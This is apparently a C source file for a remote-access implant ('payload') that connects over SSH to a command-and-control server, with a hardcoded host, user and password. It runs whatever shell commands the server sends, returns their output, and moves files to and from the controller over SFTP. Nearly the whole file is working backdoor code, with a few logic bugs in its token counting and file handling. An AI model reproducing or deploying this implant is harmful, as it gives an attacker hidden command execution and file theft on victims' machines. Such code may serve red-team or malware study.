//
// Created by rip on 7/1/19.
//

#include "payload.h"

ssh_session session;
ssh_channel channel;
const char* host = "127.0.0.1";
const int port = 4433;
const char* user = "c2user";
const char* pwd = "12345";

void setupSSH()
{
    printf("[+] Setting up SSH connection...\n");

    // create the SSH session
    session = ssh_new();
    if (session == NULL)
    {
        fprintf(stderr, "[-] Couldn't create SSH session\n");
        exit(EXIT_FAILURE);
    }
    // configure the session
    ssh_options_set(session, SSH_OPTIONS_HOST, host);
    ssh_options_set(session, SSH_OPTIONS_PORT, &port);
    ssh_options_set(session, SSH_OPTIONS_USER, user);
}

void doConnect()
{
    int returnCode;

    printf("[+] Connecting to C2...\n");
    returnCode = ssh_connect(session);
    if (returnCode != SSH_OK)
    {
        fprintf(stderr, "[-] Error connecting to %s:%s\n", host, ssh_get_error(session));
        tearDown();
        return;
    }

    handleConnection();
}

void handleConnection()
{
    int returnCode;
    char* tokens[3];
    Array output;
    char cmd[1024] = {0};

    // authenticate
    printf("[+] Authenticating...\n");
    returnCode = ssh_userauth_password(session, NULL, pwd);
    if (returnCode != SSH_AUTH_SUCCESS)
    {
        fprintf(stderr, "[-] Error authenticating: %s\n", ssh_get_error(session));
        tearDown();
        return;
    }

    // get a communication channel to the c2 server
    printf("[+] Opening communication channel...\n");
    if (!openChannel())
    {
        fprintf(stderr, "[-] Session closed without opening a channel\n");
        tearDown();
        return;
    }
    while (1)
    {
        // get cmd from c2
        rcvMsg(cmd);
        printf("[+] Got cmd from c2: %s\n", cmd);

        if(strcmp(cmd, "quit") == 0 || cmd[0] == '\0')
        {
            printf("[+] Quitting communication to c2.\n");
            break;
        }
        else if (startsWith(cmd, "upload"))
        {
            tokenize(cmd, " ", tokens);
            size_t length = sizeof(tokens) / sizeof(char *);
            if (length == 3)
            {
                upload(tokens[1], tokens[2]);
            }
            else
            {
                fprintf(stderr, "[-] Got invalid upload cmd.\n");
            }
        }
        else if (startsWith(cmd, "download"))
        {
            tokenize(cmd, " ", tokens);
            size_t length = sizeof(tokens) / sizeof(char *);

            if (length == 3)
            {
                download(tokens[1], tokens[2]);
            }
            else
            {
                fprintf(stderr, "[-] Got invalid download cmd.\n");
            }
        }
        else
        {
            // execute cmd
            printf("[+] Executing cmd...\n");
            output = execCmd(cmd);
            if (output.array[0] == '\0')
            {
                output.array = "No output";
            }
            printf("[+] Sending output to server.\n");
            sendMsg(output.array);
        }

        // clear the cmd buffer
        memset(cmd, 0, 1024);
    }
}

int openChannel()
{
    channel = ssh_channel_new(session);
    if (channel == NULL)
    {
        fprintf(stderr, "[-] Error while opening channel: %s\n", ssh_get_error(session));
        tearDown();
        return 0;
    }
    int returnCode = ssh_channel_open_session(channel);
    if (returnCode != SSH_OK)
    {
        fprintf(stderr, "[-] Error while opening channel session: %s\n", ssh_get_error(session));
        tearDown();
        return 0;
    }
    return 1;
}

void tearDown()
{
    if (channel != NULL)
    {
        if (ssh_channel_is_open(channel))
        {
            ssh_channel_close(channel);
        }
        ssh_channel_free(channel);
    }
    if (session != NULL)
    {
        if (ssh_is_connected(session))
        {
            ssh_disconnect(session);
        }
        ssh_free(session);
    }
}

void sendMsg(char *msg)
{
    if ((ssh_channel_write(channel, msg, (unsigned int) strlen(msg))) == SSH_ERROR)
    {
        fprintf(stderr, "[-] Error while writing to channel\n");
    }
}

void rcvMsg(char* buffer)
{
    if ((ssh_channel_read(channel, buffer, 1024, 0)) <= 0)
    {
        fprintf(stderr, "[-] Error while reading from channel\n");
    }
}

sftp_session setupSFTP()
{
    // create and init SFTP
    sftp_session sftp = sftp_new(session);
    if (sftp == NULL)
    {
        fprintf(stderr, "[-] Error allocating SFTP session: %s\n", ssh_get_error(session));
        return NULL;
    }
    int rc = sftp_init(sftp);
    if (rc != SSH_OK)
    {
        fprintf(stderr, "[-] Error initializing SFTP session: %i\n", sftp_get_error(sftp));
        sftp_free(sftp);
        return NULL;
    }
    return sftp;
}

void upload(char *localFilePath, char* remoteFilePath)
{
    FILE* localFile;
    char *fileBuffer;
    sftp_file file;
    ssize_t nwritten;
    int length;

    printf("[+] Uploading \"%s\" to c2 as \"%s\"\n", localFilePath, remoteFilePath);

    // read the local file
    localFile = fopen(localFilePath, "r");
    fileBuffer = readFile(localFile, &length);

    // create SFTP session
    sftp_session sftp;
    if (!(sftp = setupSFTP()))
    {
        fprintf(stderr, "[-] Error setting up SFTP.\n");
        return;
    }

    // open the remote file
    file = sftp_open(sftp, remoteFilePath, O_WRONLY | O_CREAT | O_TRUNC, S_IRWXU);
    if (file == NULL)
    {
        fprintf(stderr, "[-] Can't open file for writing: %s\n", ssh_get_error(session));
        sftp_free(sftp);
        return;
    }

    // write to it
    nwritten = sftp_write(file, fileBuffer, length);
    if (nwritten != length)
    {
        fprintf(stderr, "[-] Can't write data to file: %s\n", ssh_get_error(session));
        sftp_close(file);
        return;
    }

    // and eventually close it again
    int rc = sftp_close(file);
    if (rc != SSH_OK)
    {
        fprintf(stderr, "[-] Can't close the written file: %s\n", ssh_get_error(session));
    }

    // free up the resources
    sftp_free(sftp);

    printf("[+] Upload finished.\n");
}

void download(char *remoteFilePath, char* localFilePath)
{
    ssize_t nbytes;
    char buffer[MAX_BUFF_SIZE];
    char* dirName = "downloads";
    FILE *localFile;
    char *fullLocalPath;

    printf("[+] Downloading \"%s\" from c2 and saving as \"%s\"\n", remoteFilePath, localFilePath);

    // create/open local file to save data in
    fullLocalPath = concat("downloads/", localFilePath);
    localFile = fopen(fullLocalPath, "w");
    free(fullLocalPath);

    // make download directory if it doesn't exist yet
    if (!dirExists(dirName))
    {
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
        if (_mkdir(dirName) == -1)
#else
        if (mkdir(dirName, 0777) == -1)
#endif
        {
            printf("[-] Error creating downloads directory!\n");
        }
    }

    // create SFTP session
    sftp_session sftp;
    if (!(sftp = setupSFTP()))
    {
        fprintf(stderr, "[-] Error setting up SFTP.\n");
        return;
    }

    // open the remote file
    sftp_file file = sftp_open(sftp, remoteFilePath, O_RDONLY, S_IRWXU);
    if (file == NULL)
    {
        fprintf(stderr, "[-] Can't open file for writing: %s\n", ssh_get_error(session));
        sftp_free(sftp);
        return;
    }

    // read from it
    nbytes = sftp_read(file, buffer, sizeof(buffer));
    if (nbytes < 0)
    {
        fprintf(stderr, "[-] Error while reading file: %s", ssh_get_error(session));
        sftp_close(file);
        return;
    }

    // write into local file
    fputs(buffer, localFile);

    // and eventually close it
    int rc = sftp_close(file);
    if (rc != SSH_OK)
    {
        fprintf(stderr, "[-] Can't close the read remote file: %s\n", ssh_get_error(session));
    }

    // clean up resources
    fclose(localFile);
    sftp_free(sftp);

    printf("[+] Download finished.\n");
}

Array execCmd(char* cmd)
{
    char buff[MAX_BUFF_SIZE];
    FILE* filePointer;
    int i = 0;
    Array output;
    size_t len = 0;

    initArray(&output, 5);

#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
    if ((filePointer = _popen(cmd, "r")) == NULL)
    {
        fprintf(stderr, "[-] Error opening pipe!\n");
        return output;
    }
#else
    if ((filePointer = popen(cmd, "r")) == NULL)
    {
        fprintf(stderr, "[-] Error opening pipe!\n");
        return output;
    }

#endif
    while (fgets(buff, MAX_BUFF_SIZE, filePointer) != NULL) {
        // copy the read output into the array
        len = strlen(buff);
        for (i = 0; i < len; i++)
        {
            if (buff[i] != '\0') insertArray(&output, buff[i]);
        }
    }

#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
    if (_pclose(filePointer))
    {
        fprintf(stderr, "[-] Command not found or exited with error status\n");
    }
#else
    if (pclose(filePointer))
    {
        fprintf(stderr, "[-] Command not found or exited with error status\n");
    }
#endif

    insertArray(&output, '\0');

    return output;
}